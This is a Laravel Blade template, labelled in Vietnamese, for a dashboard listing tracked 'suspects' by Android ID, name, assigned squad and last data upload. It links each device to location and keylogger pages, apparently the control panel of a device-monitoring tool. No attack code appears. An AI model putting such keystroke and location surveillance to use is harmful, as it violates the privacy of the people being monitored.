@extends('layouts.index')

@section('title', 'Danh sách đối tượng')

@section('content')
<section class="content-header">
    <div class="container-fluid">
      <div class="row mb-2">
        <div class="col-sm-6">
          <h1>Danh sách đối tượng</h1>
        </div>
        <div class="col-sm-6">
          <ol class="breadcrumb float-sm-right">
            <li class="breadcrumb-item"><a href="/">Home</a></li>
          </ol>
        </div>
      </div>
    </div>
</section>

<section class="content">
    <div class="container-fluid">
        <div class="row">
            <div class="col-12">
                <div class="card">
                    <dic class="card-body">
                        <form action="{{ Route('dashboard') }}" method="GET">
                            <div class="row">
                                <div class="col-4">
                                    <div class="form-group">
                                        <label for="name">Tìm theo tên</label>
                                        <input name="name" type="text" class="form-control" id="name" value="{{$name}}" placeholder="Tên" autocomplete="none">
                                    </div>
                                </div>

                            </div>
                            <div class="row">
                                <div class="col-4">
                                    <button type="submit" class="btn btn-primary" style="float: right">Tìm</button>
                                </div>
                            </div>
                        </form>
                    </dic>
                </div>
            </div>
        </div>
        <div class="row">
            <div class="col-12">
              <div class="card">
                <div class="card-header">
                    <h3 class="card-title">Đối tượng</h3>
                </div>
                <!-- /.card-header -->
                <div class="card-body table-responsive p-0">
                  <table class="table table-hover text-nowrap">
                    <thead>
                      <tr>
                        <th>Android ID</th>
                        <th>Tên</th>
                        <th>Đội phụ trách</th>
                        <th>Lần cuối gửi dữ liệu</th>
                      </tr>
                    </thead>
                    <tbody>
                        @foreach ($suspects as $item)
                            <tr>
                                <td>{{ $item->android_id }}</td>
                                <td>{{ $item->name }}</td>
                                @if ($item->squad_id)
                                <td>{{ $item->squad->name }}</td>
                                @else
                                <td>-</td>
                                @endif
                                <td>{{ $item->updated_at }}</td>
                                <td class="project-actions text-right">
                                    <a class="btn btn-primary btn-sm" href="{{ Route('location', ['id' => $item->id]) }}">
                                        <i class="fas fa-map-marker-alt">
                                        </i>
                                    </a>
                                    <a class="btn btn-info btn-sm" href="{{ Route('keylogger', ['id' => $item->id]) }}">
                                        <i class="fas fa-history">
                                        </i>
                                    </a>
                                    <a class="btn btn-warning btn-sm" href="{{ Route('edit-suspect', ['id' => $item->id])}}">
                                        <i class="fas fa-pencil-alt">
                                        </i>
                                    </a>
                                    <a class="btn btn-danger btn-sm delete-button" href="" data-name="{{ $item->name }}" data-id="{{ $item->id }}" >
                                        <i class="fas fa-trash-alt">
                                        </i>
                                    </a>

                                </td>
                            </tr>
                        @endforeach
                    </tbody>
                  </table>
                </div>
                <!-- /.card-body -->
                <div class="card-footer">
                    {{ $suspects->links('pagination::bootstrap-4') }}
                </div>
              </div>
              <!-- /.card -->
            </div>
          </div>
    </div>
</section>
@endsection
